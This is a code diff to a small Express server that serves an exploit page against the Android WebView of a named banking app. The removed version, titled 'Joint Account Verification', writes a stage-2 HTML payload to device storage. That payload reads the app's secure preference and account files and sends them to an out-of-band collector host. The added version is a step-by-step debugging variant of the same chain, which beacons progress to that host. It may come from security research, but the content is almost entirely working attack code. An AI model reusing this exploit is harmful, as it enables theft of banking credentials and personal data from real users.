@@ -8,77 +8,62 @@ app.disable("x-powered-by");
 app.use(express.urlencoded({ extended: false }));
 app.use(express.static(path.join(__dirname, "public")));
 
-app.get("/", (_req, res) => {
+app.get("/exploit.html", (_req, res) => {
   res.type('html').send(`<!DOCTYPE html>
 <html>
-<head><title>Joint Account Verification</title></head>
+<head><title>Test</title></head>
 <body>
-<p>Verifying your information, please wait...</p>
+<p id="status">Starting...</p>
 <script>
-// --- STAGE 2 PAYLOAD ---
-// This HTML will execute in a file:// context where setAllowFileAccessFromFileURLs(true)
-// permits XHR to other file:// URLs. Exfiltration uses the JS bridge EXTERNAL_WEBVIEW
-// to open the external browser (bypasses setAllowUniversalAccessFromFileURLs=false).
+var SERVER = "https://edzgaslqbiamjmvftfea7klu2g2d78cp3.oast.fun";
 
-var stage2Html = [
-'<!DOCTYPE html>',
-'<html><body><script>',
-'var stolen = {};',
-'var targets = [',
-'  "/data/data/com.rbc.mobile.android/shared_prefs/SecurePrefs.xml",',
-'  "/data/data/com.rbc.mobile.android/shared_prefs/RBC Mobile.xml",',
-'  "/data/data/com.rbc.mobile.android/shared_prefs/accounts.xml",',
-'  "/data/data/com.rbc.mobile.android/shared_prefs/autoBackupSharedPref.xml",',
-'  "/data/data/com.rbc.mobile.android/shared_prefs/fingerprint_preference_name.xml",',
-'  "/data/data/com.rbc.mobile.android/shared_prefs/ASYNC_NOTIFICATION_PREF.xml"',
-'];',
-'var completed = 0;',
-'targets.forEach(function(path) {',
-'  var xhr = new XMLHttpRequest();',
-'  xhr.open("GET", "file://" + path, true);',
-'  xhr.onreadystatechange = function() {',
-'    if (xhr.readyState === 4) {',
-'      if (xhr.status === 0 || xhr.status === 200) {',
-'        stolen[path] = xhr.responseText;',
-'      }',
-'      completed++;',
-'      if (completed === targets.length) {',
-'        // Exfiltrate via JS bridge -> external browser (bypasses universal access restriction)',
-'        var data = encodeURIComponent(JSON.stringify(stolen));',
-'        WebViewFragment.onNavigateWebHook(JSON.stringify({',
-'          "version": "1.2",',
-'          "type": "externalWebview",',
-'          "destination": "https://edzgaslqbiamjmvftfea7klu2g2d78cp3.oast.fun/collect?d=" + data',
-'        }));',
-'      }',
-'    }',
-'  };',
-'  xhr.send();',
-'});',
-'<\\/script><\\/body><\\/html>'
-].join('\n');
+function log(step) {
+    document.getElementById("status").innerText = step;
+    new Image().src = SERVER + "/log?step=" + encodeURIComponent(step);
+}
 
-// --- STEP 1: Write stage-2 HTML to predictable path via DYNAMIC_DOWNLOAD_DOCUMENT ---
-// File is written to: /storage/emulated/0/Android/data/com.rbc.mobile.android/files/verify.html
-// No URL validation, no file-type check — writeBase64ToFile() writes raw decoded bytes.
+// Step 1: Confirm the page loaded at all
+log("1-page-loaded");
 
-var base64Payload = btoa(stage2Html);
+// Step 2: Check if the JS bridge exists
+if (typeof WebViewFragment === "undefined") {
+    log("FAIL-no-bridge");
+} else {
+    log("2-bridge-exists");
 
-WebViewFragment.onFeatureEventWebHook(JSON.stringify({
-    "version": "1.2",
-    "type": "dynamicDownloadDocument",
-    "targetFileBase64": base64Payload,
-    "fileName": "verify.html"
-}));
+    // Step 3: Try DYNAMIC_DOWNLOAD_DOCUMENT
+    try {
+        var testHtml = '<html><body><script>' +
+            'try {' +
+            '  WebViewFragment.onNavigateWebHook(JSON.stringify({' +
+            '    "version": "1.2",' +
+            '    "type": "externalWebview",' +
+            '    "destination": "' + SERVER + '/log?step=5-file-context-alive"' +
+            '  }));' +
+            '} catch(e) {' +
+            '  document.title = "bridge-error: " + e;' +
+            '}' +
+            '<\\/script></body></html>';
 
-// --- STEP 2: Navigate WebView to the file:// path ---
-// shouldOverrideUrlLoading only intercepts tel: — file:// falls through.
-// setAllowFileAccess(true) permits the WebView to load file:// URLs.
-// The JS bridge (addJavascriptInterface) persists across navigation.
+        WebViewFragment.onFeatureEventWebHook(JSON.stringify({
+            "version": "1.2",
+            "type": "dynamicDownloadDocument",
+            "targetFileBase64": btoa(testHtml),
+            "fileName": "verify.html"
+        }));
+        log("3-download-called");
+    } catch(e) {
+        log("FAIL-download-error-" + e.message);
+    }
 
-setTimeout(function() {
-    window.location = "file:///storage/emulated/0/Android/data/com.rbc.mobile.android/files/verify.html";
-}, 1500);
+    // Step 4: Navigate to file after short delay
+    setTimeout(function() {
+        log("4-about-to-navigate");
+        setTimeout(function() {
+            window.location = "file:///storage/emulated/0/Android/data/com.rbc.mobile.android/files/verify.html";
+        }, 500);
+    }, 1500);
+}
 </script>
 </body>
 </html>`);
